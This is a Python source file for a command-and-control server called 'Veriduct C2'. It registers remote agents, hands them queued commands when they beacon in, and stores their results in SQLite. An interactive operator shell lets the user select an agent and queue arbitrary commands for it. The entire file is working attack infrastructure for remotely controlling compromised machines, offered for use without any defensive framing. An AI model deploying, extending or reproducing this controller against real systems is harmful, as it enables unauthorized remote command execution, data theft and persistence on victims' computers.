#!/usr/bin/env python3
"""
Veriduct C2 Server
Minimal HTTP server for C2 agent communication
"""

import json
import time
import sqlite3
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from datetime import datetime

PORT = 8443
DB = "c2.db"

# Initialize database
conn = sqlite3.connect(DB, check_same_thread=False)
conn.execute("""CREATE TABLE IF NOT EXISTS agents (
    agent_id TEXT PRIMARY KEY, info TEXT, first_seen TEXT, last_seen TEXT)""")
conn.execute("""CREATE TABLE IF NOT EXISTS commands (
    id INTEGER PRIMARY KEY, agent_id TEXT, cmd TEXT, args TEXT, 
    created TEXT, executed TEXT, result TEXT)""")
conn.commit()

class C2Handler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {format % args}")
    
    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        
        agent_id = params.get('agent', [None])[0]
        
        # Register endpoint
        if parsed.path == '/register' and agent_id:
            info = params.get('info', [''])[0]
            now = datetime.utcnow().isoformat()
            
            conn.execute(
                "INSERT OR REPLACE INTO agents (agent_id, info, first_seen, last_seen) VALUES (?, ?, ?, ?)",
                (agent_id, info, now, now))
            conn.commit()
            
            print(f"[+] Agent registered: {agent_id}")
            
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'{"status":"registered"}')
            return
        
        # Beacon endpoint - return pending commands
        elif parsed.path == '/beacon' and agent_id:
            now = datetime.utcnow().isoformat()
            conn.execute("UPDATE agents SET last_seen=? WHERE agent_id=?", (now, agent_id))
            conn.commit()
            
            cursor = conn.execute(
                "SELECT id, cmd, args FROM commands WHERE agent_id=? AND executed IS NULL",
                (agent_id,))
            
            commands = []
            for row in cursor.fetchall():
                cmd_id, cmd, args = row
                commands.append({"id": cmd_id, "cmd": cmd, "args": args})
                
                # Mark as executed
                conn.execute(
                    "UPDATE commands SET executed=? WHERE id=?",
                    (now, cmd_id))
            
            conn.commit()
            
            if commands:
                print(f"[*] Sending {len(commands)} command(s) to {agent_id}")
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(commands).encode())
            return
        
        self.send_response(404)
        self.end_headers()
    
    def do_POST(self):
        parsed = urlparse(self.path)
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length).decode('utf-8', errors='ignore')
        params = parse_qs(body)
        
        agent_id = params.get('agent', [None])[0]
        
        # Result endpoint
        if parsed.path == '/result' and agent_id:
            result = params.get('result', [''])[0]
            
            # Store result for most recent command
            cursor = conn.execute(
                "SELECT id FROM commands WHERE agent_id=? AND result IS NULL ORDER BY executed DESC LIMIT 1",
                (agent_id,))
            
            row = cursor.fetchone()
            if row:
                conn.execute("UPDATE commands SET result=? WHERE id=?", (result, row[0]))
                conn.commit()
                print(f"[*] Result from {agent_id}: {result[:100]}")
            
            self.send_response(200)
            self.end_headers()
            return
        
        self.send_response(404)
        self.end_headers()


def shell():
    """Interactive shell for C2 control"""
    print("\nVeriduct C2 Shell")
    print("Commands: agents, use <id>, cmd <command>, exit\n")
    
    current_agent = None
    
    while True:
        try:
            prompt = f"[{current_agent or 'c2'}]> " if current_agent else "c2> "
            line = input(prompt).strip()
            
            if not line:
                continue
            
            parts = line.split(' ', 1)
            cmd = parts[0]
            args = parts[1] if len(parts) > 1 else ""
            
            if cmd == 'agents':
                cursor = conn.execute("SELECT agent_id, info, last_seen FROM agents")
                print("\nActive Agents:")
                for row in cursor.fetchall():
                    agent_id, info, last_seen = row
                    print(f"  {agent_id}: {info} (last: {last_seen})")
                print()
            
            elif cmd == 'use':
                current_agent = args
                print(f"[*] Using agent: {current_agent}\n")
            
            elif cmd == 'cmd' and current_agent:
                # Parse command and args
                cmd_parts = args.split(' ', 1)
                command = cmd_parts[0]
                cmd_args = cmd_parts[1] if len(cmd_parts) > 1 else ""
                
                now = datetime.utcnow().isoformat()
                conn.execute(
                    "INSERT INTO commands (agent_id, cmd, args, created) VALUES (?, ?, ?, ?)",
                    (current_agent, command, cmd_args, now))
                conn.commit()
                print(f"[+] Command queued: {command} {cmd_args}\n")
            
            elif cmd == 'results' and current_agent:
                cursor = conn.execute(
                    "SELECT cmd, args, executed, result FROM commands WHERE agent_id=? ORDER BY executed DESC LIMIT 10",
                    (current_agent,))
                print("\nRecent Results:")
                for row in cursor.fetchall():
                    cmd, args, executed, result = row
                    print(f"  [{executed}] {cmd} {args}")
                    if result:
                        print(f"    Result: {result[:200]}")
                print()
            
            elif cmd == 'exit':
                break
            
            else:
                print("Unknown command or no agent selected\n")
        
        except KeyboardInterrupt:
            print("\nUse 'exit' to quit")
        except Exception as e:
            print(f"Error: {e}")


if __name__ == "__main__":
    import threading
    
    # Start HTTP server in background
    server = HTTPServer(('0.0.0.0', PORT), C2Handler)
    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()
    
    print(f"[*] C2 Server listening on port {PORT}")
    print(f"[*] Database: {DB}")
    
    # Run interactive shell
    try:
        shell()
    except KeyboardInterrupt:
        pass
    
    print("\n[*] Shutting down...")
    server.shutdown()
